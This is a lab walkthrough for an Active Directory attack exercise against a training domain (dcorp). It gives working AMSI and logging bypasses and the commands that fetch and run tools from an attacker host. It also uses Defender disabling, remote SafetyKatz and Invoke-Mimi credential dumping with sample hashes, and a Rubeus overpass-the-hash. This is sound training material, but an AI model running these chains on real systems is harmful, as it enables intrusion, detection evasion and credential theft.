# LO 7

Identify a machine in the target domain where a Domain Admin session is available.

Compromise the machine and escalate privileges to Domain Admin

* Using access to dcorp-ci
* Using derivative local admin

We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

First bypass Enhanced Script Block Logging so that the AMSI bypass is not logged.&#x20;

The below command bypasses Enhanced Script Block Logging:

```powershell
c:\AD\Tools\hfs.exe C:\AD\Tools\sbloggingbypass.txt
```

```
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```

Use the below command to bypass AMSI:

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Now, download and execute **PowerView** in memory of the reverse shell and run **FindDomainUserLocation**. Note that, Find-DomainUserLocation may take many minutes to check all the machines in the domain:

```powershell
c:\AD\Tools\hfs.exe C:\AD\Tools\PowerView.ps1
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
Find-DomainUserLocation

<# Output example:
UserDomain : dcorp
UserName : svcadmin
ComputerName : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress : 172.16.4.44
SessionFrom :
SessionFromName :
LocalAdmin :
[snip]#>
```

There is a domain admin session on dcorp-mgmt server.

We can abuse this using [winrs ](lo-7.md#using-winrs)or [PowerShell Remoting](lo-7.md#using-powershell-remoting).

## Abusing domain admin session on dcorp-mgmt&#x20;

### Using winrs

Check if we can execute commands on dcorp-mgmt server and if the **winrm** port is open:

```
winrs -r:dcorp-mgmt hostname;whoami
```

We would now run **SafetyKatz.exe** on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt. Let's download **Loader.exe** on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

Run the following command on the reverse shell:

```
c:\AD\Tools\hfs.exe C:\ad\Tools\Loader.exe
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

Load and execute SafetyKatz on dcorp-mgmt:

```
$null | winrs -r:dcorp-mgmtC:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

Load and execute SafetyKatz.exe on dcorp-mgmt:

```
c:\AD\Tools\hfs.exe C:\ad\Tools\SafetyKatz.exe
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa:ekeys exit
```

{% hint style="danger" %}
The last command above could not work due to Windows Defender which can block SafeKatz execution, so we need to pass encoded arguments using **Safety.bat**
{% endhint %}

```
c:\AD\Tools\hfs.exe C:\ad\Tools\Safety.bat

```

{% hint style="info" %}
SAfety.bat is ready but it can be generated using ArgSplit.bat and passing the arguments that need encoding:

<pre><code>C:\AD\Tools>ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: <a data-footnote-ref href="#user-content-fn-1">sekurlsa::ekeys</a>
</code></pre>
{% endhint %}

Download the batch file on dcorp-ci. Run the below commands on the reverse shell:

```
iwr http://172.16.100.x/Safety.bat -OutFile C:\Users\Public\Safety.bat
```

Now, copy the Safety.bat to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
```

Run Safety.bat on dcorp-mgmt that use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt:

```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Safety.bat"
```

Example output:

```
Authentication Id : 0 ; 61671 (00000000:0000f0e7)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 2/21/2024 4:32:02 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       [...]
```

### Using PowerShell Remoting

Check if we can run commands on dcorp-mgmt using PowerShell remoting.

```
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
```

Now, let's use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin "svcadmin".&#x20;

```
c:\AD\Tools\hfs.exe C:\ad\Tools\Invoke-Mimi.ps1
iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
```

Now, to use Invoke-Mimi on dcorp-mgmt, we must disable AMSI there. Please note that we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt:

```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

```
Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

Example output:

```
[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 3/3/2023 2:39:12 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
	* Username : svcadmin
	* Domain : DOLLARCORP.MONEYCORP.LOCAL
	* Password : (null)
	* Key List :
 aes256_hmac
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
rc4_hmac_old b38ff50264b74508085d82c69794a4d8
rc4_md4 b38ff50264b74508085d82c69794a4d8
rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
[snip]
```

Finally, use OverPass-the-Hash to use svcadmin's credentials.

Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.)

We will use Rubeus in this case. Note that we are passing encoded arguments to Loader to avoid detection.

Run the below command from an **elevated CMD shell** from our local machine:

```
C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: asktgt
```

Run the above commands in the same command prompt session:

```
C:\Windows\system32>set "z=t"
C:\Windows\system32>set "y=g"
C:\Windows\system32>set "x=t"
C:\Windows\system32>set "w=k"
C:\Windows\system32>set "v=s"
C:\Windows\system32>set "u=a"
C:\Windows\system32>set "Pwn=%u%%v%%w%%x%%y%%z%"
```

Using Rubeus:

```
echo %Pwn%
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

A new shell will spawn. Try accessing the domain controller from the new process:

```
winrs -r:dcorp-dc cmd /c set username
```

## Derivative Local Admin



[^1]: 
